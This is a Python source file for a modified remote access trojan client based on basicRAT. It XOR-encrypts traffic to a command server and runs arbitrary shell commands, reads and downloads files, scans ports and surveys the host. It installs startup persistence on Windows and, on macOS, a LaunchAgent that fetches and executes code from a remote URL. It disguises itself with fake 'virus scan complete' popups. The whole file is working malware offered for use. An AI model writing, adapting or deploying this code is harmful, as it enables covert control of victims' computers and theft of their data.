#!/usr/bin/env python

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import threading
import sys, os
import ctypes
import getpass
import platform
import time
import urllib
import uuid
import datetime
import subprocess
import zipfile

# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print 'This platform is not supported.'
    sys.exit(1)

# change these to suit your needs
HOST = '127.0.0.1'
PORT = 8004
REMOTE = "https://secscan.oss-cn-hangzhou.aliyuncs.com/virusKiller.command"


def xor(text):
    crypt = []
    for i in range(len(text)):
        crypt.append(chr(ord(text[i]) ^ 93))

    return "".join(crypt)


def windows_persistence():
    import os, string, random
    try:
        appdata = os.path.expandvars("%AppData%")
        target = appdata + "\desktop.exe"

        if sys.executable == target:
            return True, "already added to start"

        startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
        if os.path.exists(appdata):
            with open(sys.executable, "rb") as f1:
                with open(target, "wb") as f2:
                    f2.write(f1.read())

            if os.path.exists(startup_dir):
                random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(2,4))])
                persistence_file = os.path.join(startup_dir, '%s.desktop.url' % random_name)

                content = '\n[InternetShortcut]\nURL=file:///%s\n' % target

                f = open(persistence_file, 'w')
                f.write(content)
                f.close()
            
                return True, 'startup file add success'
            else:
                return False, 'startup file add failed'

    except WindowsError:
        return False, 'startup file add failed'


def linux_persistence():
    return False, 'nothing here yet'


def mac_persistence():
    with open(os.path.expanduser("~") + "/Library/LaunchAgents/groundtime.plist", "w") as f:
        f.write("""
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.example.hello</string>
                <key>ProgramArguments</key>
                <array>
                    <string>/usr/bin/python</string>
                    <string>-c</string>
                    <string>import urllib;exec urllib.urlopen("%s").read()</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
            </dict>
            </plist>
        """ % REMOTE )

    return True, 'startup file add success'


def persistence(plat):
    if plat == 'win':
        success, details = windows_persistence()
    elif plat == 'nix':
        success, details = linux_persistence()
    elif plat == 'mac':
        success, details = mac_persistence()
    else:
        return 'Error, platform unsupported.'

    if success:
        results = 'Persistence successful, {}.'.format(details)
    else:
        results = 'Persistence unsuccessful, {}.'.format(details)

    return results

PORTS = [ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 179, 443, 445,
514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888 ]


def single_host(ip):
    try:
        socket.inet_aton(ip)
    except socket.error:
        return 'Error: Invalid IP address.'

    results = ''

    for p in PORTS:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c = s.connect_ex((ip, p))
        socket.setdefaulttimeout(0.5)

        state = 'open' if not c else 'closed'

        results += '{:>5}/tcp {:>7}\n'.format(p, state)

    return results.rstrip()


SURVEY_FORMAT = '''
System Platform     - {}
Processor           - {}
Architecture        - {}
Internal IP         - {}
External IP         - {}
MAC Address         - {}
Internal Hostname   - {}
External Hostname   - {}
Hostname Aliases    - {}
FQDN                - {}
Current User        - {}
System Datetime     - {}
Admin Access        - {}'''


def survey(plat):
    # OS information
    sys_platform = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]

    # session information
    username = getpass.getuser()

    # network information
    hostname    = socket.gethostname()
    fqdn        = socket.getfqdn()
    try:
        internal_ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        internal_ip = ''
    raw_mac     = uuid.getnode()
    mac         = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))

    # get external ip address
    ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw',
                   'wtfismyip.com/text' ]
    external_ip = ''
    for url in ex_ip_grab:
        try:
            external_ip = urllib.urlopen('http://'+url).read().rstrip()
        except IOError:
            pass
        if external_ip and (6 < len(external_ip) < 16):
            break

    # reverse dns lookup
    try:
        ext_hostname, aliases, _ = socket.gethostbyaddr(external_ip)
    except (socket.herror, NameError):
        ext_hostname, aliases = '', []
    aliases = ', '.join(aliases)

    # datetime, local non-DST timezone
    dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
         time.localtime())

    # platform specific
    is_admin = False

    if plat == 'win':
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    elif plat in ['nix', 'mac']:
        is_admin = os.getuid() == 0

    admin_access = 'Yes' if is_admin else 'No'

    # return survey results
    return SURVEY_FORMAT.format(sys_platform, processor, architecture,
    internal_ip, external_ip, mac, hostname, ext_hostname, aliases, fqdn,
    username, dt, admin_access)


def cat(file_path):
    if os.path.isfile(file_path):
        try:
            with open(file_path) as f:
                return f.read(4000)
        except IOError:
            return 'Error: Permission denied.'
    else:
        return 'Error: File not found.'


def execute(command):
    output = subprocess.Popen(command, shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             stdin=subprocess.PIPE)
    return output.stdout.read() + output.stderr.read()


def ls(path):
    if not path:
        path = '.'

    if os.path.exists(path):
        try:
            return '\n'.join(os.listdir(path))
        except OSError:
            return 'Error: Permission denied.'
    else:
        return 'Error: Path not found.'


def pwd():
    return os.getcwd()


def selfdestruct(plat):
    if plat == 'win':
        import _winreg
        from _winreg import HKEY_CURRENT_USER as HKCU

        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

        try:
            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(reg_key, 'br')
            _winreg.CloseKey(reg_key)
        except WindowsError:
            pass

    elif plat == 'nix':
        pass

    elif plat == 'mac':
        pass

    # self delete basicRAT
    os.remove(sys.argv[0])
    sys.exit(0)


def unzip(f):
    if os.path.isfile(f):
        try:
            with zipfile.ZipFile(f) as zf:
                zf.extractall('.')
                return 'File {} extracted.'.format(f)
        except zipfile.BadZipfile:
            return 'Error: Failed to unzip file.'
    else:
        return 'Error: File not found.'


def wget(url):
    if not url.startswith('http'):
        return 'Error: URL must begin with http:// or https:// .'

    fname = url.split('/')[-1]
    if not fname:
        dt = str(datetime.datetime.now()).replace(' ', '-').replace(':', '-')
        fname = 'file-{}'.format(dt)

    try:
        urllib.urlretrieve(url, fname)
    except IOError:
        return 'Error: Download failed.'

    return 'File {} downloaded.'.format(fname)







# seconds to wait before client will attempt to reconnect
CONN_TIMEOUT = 5



def client_loop(conn):
    while True:
        results = ''

        # wait to receive data from server
        data = xor(conn.recv(4096))

        # seperate data into command and action
        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            return 1

        elif cmd == 'selfdestruct':
            conn.close()
            selfdestruct(PLAT)

        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'persistence':
            results = persistence(PLAT)

        elif cmd == 'scan':
            results = single_host(action)

        elif cmd == 'survey':
            results = survey(PLAT)

        elif cmd == 'cat':
            results = cat(action)

        elif cmd == 'execute':
            results = execute(action)

        elif cmd == 'ls':
            results = ls(action)

        elif cmd == 'pwd':
            results = pwd()

        elif cmd == 'unzip':
            results = unzip(action)

        elif cmd == 'wget':
            results = wget(action)

        results = results.rstrip() + '\n{} completed.'.format(cmd)

        conn.send(xor(results))


def main():
    exit_status = 0


    if sys.platform.startswith('win'):
        persistence(PLAT)

    while True:
        conn = socket.socket()

        try:
            # attempt to connect to basicRAT server
            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue

        # This try/except statement makes the client very resilient, but it's
        # horrible for debugging. It will keep the client alive if the server
        # is torn down unexpectedly, or if the client freaks out.
        try:
            exit_status = client_loop(conn)
        except: pass

        if exit_status:
            sys.exit(0)


if __name__ == '__main__':

    if PLAT == "win":

        import win32api, win32con
        import win32ui

        def winpop():
            def btnClose():
                time.sleep(20)
                try:
                    hd = win32ui.FindWindow(None, "scan")
                    hd.SendMessage(win32con.WM_CLOSE)
                except:
                    pass
                win32api.MessageBox(0, "The scan is complete, no virus was not found",  "scan", win32con.MB_OK)

            thread = threading.Thread(target=btnClose)
            thread.start()

            win32api.MessageBox(0, u"Background scanning...", "scan", win32con.MB_OK)

            thread.join()

        threading.Thread(target=winpop).start()

    main()
